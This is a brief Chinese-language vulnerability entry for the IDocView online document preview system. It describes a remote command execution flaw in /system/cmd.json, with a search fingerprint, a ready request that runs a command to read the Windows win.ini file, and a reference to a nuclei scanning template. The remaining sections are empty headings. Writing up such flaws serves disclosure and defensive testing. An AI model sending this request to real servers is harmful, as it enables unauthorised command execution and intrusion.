# IDocView在线文档预览系统cmd存在远程代码执行漏洞

- **系统**：IDocView　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="I Doc View"`
- **请求**：`GET /system/cmd.json?cmd=type+c:\\Windows\win.ini HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

nuclei脚本\
\[i-doc-view-system-cmd-rce.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- I Doc View在线文档预览系统cmd存在远程代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * I Doc View